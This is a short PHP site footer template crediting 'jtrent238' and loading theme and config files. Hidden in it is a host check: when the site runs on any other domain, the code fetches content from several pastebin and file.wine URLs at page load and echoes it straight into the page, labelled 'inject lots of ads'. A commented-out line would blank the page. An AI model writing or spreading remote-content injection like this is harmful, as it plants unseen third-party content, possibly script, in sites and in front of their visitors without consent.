
<div class="w3-container w3-blue">
	<div class="w3-container w3-display-bottommiddle">
		<p class="w3-text">
			Site made by
			<a href="https://github.com/jtrent238">jtrent238</a>
		</p>
	</div>
</div>
<?php
	include('theme.php'); // sets the them of each page (configure in config.php)
	include_once('config.php'); // loads config file
?>

<?php
if ($_SERVER['HTTP_HOST'] != 'stfh.jtrent238.tk') {
	// Wipe the page
	//echo('<script type="text/javascript">window.onload = document.body.style.display = "none";</script>');}
	// inject lots of ads
	echo(file_get_contents('https://pastebin.com/raw/eKqeNd0G'));
	echo(file_get_contents('https://pastebin.com/raw/XFPXiTLk'));
	
	echo(file_get_contents('https://pastebin.com/raw/0MXNf6nq'));
	echo(file_get_contents('https://file.wine/mMLFsK1JX4.txt'));
	echo(file_get_contents('https://pastebin.com/raw/eKqeNd0G'));

	

	$isMySite = false;
}
?>